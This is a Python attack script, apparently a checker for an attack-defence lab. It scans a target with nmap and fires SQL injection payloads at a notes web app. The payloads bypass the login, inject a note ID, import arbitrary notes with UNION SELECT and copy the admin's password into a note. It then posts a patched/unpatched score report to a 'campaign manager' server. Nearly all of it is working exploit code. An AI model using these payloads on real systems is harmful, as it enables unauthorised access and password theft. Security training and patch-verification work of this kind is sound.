import sys
import os
import time
import socket
import subprocess
import requests

bypassable = False
if(len(sys.argv) != 3):
    print("Script takes 2 argument; IP address of host. to attack and the campaign managers ip")
    exit()

#############  SETUP  #############
target_ip = sys.argv[1]
manager_ip = sys.argv[2]
print("Attacking "+target_ip+" from my own ip: "+manager_ip)
requests.post("http://"+manager_ip+":8855/info",json={"error":"script running"})

#############  NMAP  #############
os.system("nmap -sC -sV "+target_ip)
time.sleep(20)


#############  REQUESTS  #############


bypassable = False
idinjectable = False
importinjectable = False
passwordgrabbable = False
#SQL INJECT BYPASS LOGIN

session = requests.session()
burp0_url = "http://"+target_ip+":80/login/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/login/", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"username": "admin", "password": "' OR 1=1 -- -"}
res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(res.text)
if "Note Overview" in res.text:
    bypassable=True
    print("I can bypass login with `' OR 1=1 -- -` and read admin notes.")
time.sleep(2)
#CREATE USER IF NOT BYPASSABLE AND THEN LOGIN
if(not bypassable):
    burp0_url = "http://"+target_ip+":80/register/"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/register/", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"username": "testuser", "password": "testuser"}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

    time.sleep(2)

    burp0_url = "http://"+target_ip+":80/login/"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/login/", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"username": "testuser", "password": "testuser"}
    session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    
#Now a session exists. Check if we can inject in new notes.
time.sleep(2)
#Check if we can make a note where we specify ID
burp0_url = "http://"+target_ip+":80/notes/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/notes/", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"noteinput": "message', 123); -- -", "submit_button": "add note"}
r = session.post(burp0_url, headers=burp0_headers,  data=burp0_data)
if("Note ID: 123" in r.text):
    idinjectable = True
    print("managed to inject id param")
time.sleep(2)
#Check if we can import any note from id.
burp0_url = "http://"+target_ip+":80/notes/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/notes/", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"noteid": "0 UNION SELECT * FROM notes WHERE id=1-- -", "submit_button": "import note"}
r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
if("Note ID: 1234567890" in r.text):
    importinjectable = True
    print("managed to import any note from id")
time.sleep(2)
#Check if we can steal passwords by making a new note.
burp0_url = "http://"+target_ip+":80/notes/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/notes/", "Upgrade-Insecure-Requests": "1"}
burp0_data = {"noteinput": "'||(SELECT password FROM users WHERE username=\"admin\")||'", "submit_button": "add note"}
r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
if("password" in r.text):
    passwordgrabbable = True
    print("managed to steal passwords by making a new note.")



toPost= {
    "attackName": "notessqli",
    "checks": [
        {
            "name": "bypass login",
            "description": "True if sqli allows bypassing login",
            "patched": not bypassable,
            "score": 20
        },
        {
            "name": "Inject in ID",
            "description": "True if you can still inject sql in the id field.",
            "patched": not idinjectable,
            "score": 10
        },
        {
            "name": "Import any note",
            "description": "True if you could still do sqli in the note import field.",
            "patched": not importinjectable,
            "score": 30
        },
        {
            "name": "Password grabbable",
            "description": "True if an attacker can import a note that contains another users password",
            "patched": not passwordgrabbable,
            "score": 50
        }
    ]
}

requests.post("http://"+manager_ip+":8855/info",json=toPost)

